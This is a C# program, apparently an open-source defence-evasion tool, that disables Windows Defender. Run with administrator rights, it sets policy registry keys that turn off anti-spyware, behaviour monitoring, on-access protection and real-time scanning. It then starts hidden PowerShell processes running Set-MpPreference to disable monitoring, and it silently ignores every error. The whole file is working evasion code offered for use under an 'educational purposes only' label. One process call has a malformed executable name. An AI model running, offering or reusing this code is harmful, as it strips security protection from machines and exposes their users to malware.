using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : Disable Windows Defender v0.2
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only. 

namespace Disable_Windows_Defender
{
    class Program
    {
        static void Main()
        {

            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            try
            {
                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableAntiSpyware", "00000001", RegistryValueKind.DWord);
            }
            catch { }

            try
            {
                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableBehaviorMonitoring", "00000001", RegistryValueKind.DWord);

                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableOnAccessProtection", "00000001", RegistryValueKind.DWord);

                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", RegistryKeyPermissionCheck.ReadWriteSubTree).SetValue("DisableScanOnRealtimeEnable", "00000001", RegistryValueKind.DWord);
            }
            catch { }

            Thread.Sleep(100);

            try
            {
                ProcessStartInfo ps = new ProcessStartInfo();
                ps.FileName = "powershell.exe";
                ps.Arguments = " Set-MpPreference -DisableRealtimeMonitoring $true";
                ps.WindowStyle = ProcessWindowStyle.Hidden;
                Process process = new Process();
                process.StartInfo = ps;
                process.Start();
            }
            catch { }

            Thread.Sleep(100);

            try
            {
                ProcessStartInfo ps = new ProcessStartInfo();
                ps.FileName = "powershell.exe -executionpolicy";
                ps.Arguments = " Set-MpPreference -DisableBehaviorMonitoring $true";
                ps.WindowStyle = ProcessWindowStyle.Hidden;
                Process process = new Process();
                process.StartInfo = ps;
                process.Start();
            }
            catch { }
        }
    }
}
